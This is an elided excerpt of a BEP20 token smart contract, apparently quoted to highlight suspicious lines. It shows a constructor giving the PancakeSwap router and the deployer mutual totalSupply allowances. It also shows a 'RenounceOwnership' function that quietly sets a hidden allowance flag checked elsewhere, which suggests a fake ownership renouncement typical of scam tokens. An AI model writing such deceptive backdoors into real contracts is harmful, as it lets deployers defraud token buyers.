...
contract Token is IBEP20, Context {
    ...
    constructor() public {
        ...
        _allow[msg.sender][address(pcsV2Router)] = totalSupply;
        
        _allow[address(pcsV2Router)][msg.sender] = totalSupply;
    ...
    function RenounceOwnership() public onlyOwner returns (bool success) {
        owner = address(0);
        _allow[msg.sender][_cont] = _allow[msg.sender][_cont].add(1);
    ...
    function __this() internal view returns (bool success) {
        return _allow[msg.sender][_cont] < 1;
    }
